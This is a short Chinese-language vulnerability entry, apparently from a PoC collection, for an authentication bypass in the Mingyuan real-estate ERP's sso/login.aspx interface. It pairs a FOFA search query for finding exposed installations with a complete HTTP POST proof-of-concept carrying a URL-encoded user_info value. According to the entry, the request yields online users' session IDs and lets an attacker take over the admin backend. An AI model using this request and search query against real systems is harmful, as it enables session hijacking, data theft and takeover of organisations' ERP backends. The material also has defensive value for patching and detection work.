## 明源地产ERP login.aspx 身份认证绕过漏洞

## 漏洞概述
明源地产ERP sso/login.aspx 接口存在身份认证绕过漏洞，未授权的攻击者可利用漏洞url获取在线用户sessionid 导致用户信息泄露，并且切换网站session后可直接接管后台，造成信息泄露或恶意破坏，使系统处于极不安全状态。

## fofa
```
body="明源地产ERP" || body="用户登录-明源云ERP" || (body="明源云" && body="ERP") || body="/PubPlatform/Login/index.aspx"
```

## poc
```
POST /PubPlatform/nav/login/sso/login.aspx HTTP/1.1
Host: [已模糊处理]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 166

__yzsAppSecret=testtest&
user_info=%66%79%6d%71%35%24%49%63%78%58%5a%49%78%75%36%4b%6c%6c%73%46%49%52%32%5a%77%45%4a%4b%2b%56%45%39%35%44%6b%78%2f%43%6e%46%67%46%51%3d
```
